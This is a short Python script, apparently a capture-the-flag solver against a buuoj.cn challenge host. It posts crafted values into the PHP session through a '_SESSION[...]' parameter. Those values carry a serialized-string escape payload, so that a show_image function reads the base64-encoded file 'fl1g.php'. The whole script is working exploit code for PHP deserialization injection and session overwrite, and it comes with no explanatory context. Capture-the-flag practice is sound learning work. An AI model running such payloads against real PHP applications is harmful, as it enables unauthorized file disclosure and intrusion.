import requests
import time

url = "http://4079c9cb-e2e3-4d7b-9bc1-a686b76e15a2.node5.buuoj.cn:81/index.php"

session = requests.Session()

# First, let's verify the basic request works
r = session.get(url + "?f=show_image")
print(f"Basic GET: {r.status_code}, {r.text[:100]}")

time.sleep(0.5)

# Now let's try POST with different data
data = {"_SESSION[user]": "test"}
r = session.post(url + "?f=show_image", data=data)
print(f"\nPOST with _SESSION[user]=test: {r.status_code}, {r.text[:100]}")

time.sleep(0.5)

# Try with a simple injection
data = {"_SESSION[user]": 'flag";s:3:"img";s:9:"ZmwxZy5waHA=";}'}
r = session.post(url + "?f=show_image", data=data)
print(f"\nPOST with injection: {r.status_code}, {r.text[:200]}")

time.sleep(0.5)

# Try with key name escape
data = {"_SESSION[flag]": '";s:3:"img";s:9:"ZmwxZy5waHA=";}'}
r = session.post(url + "?f=show_image", data=data)
print(f"\nPOST with key escape: {r.status_code}, {r.text[:200]}")

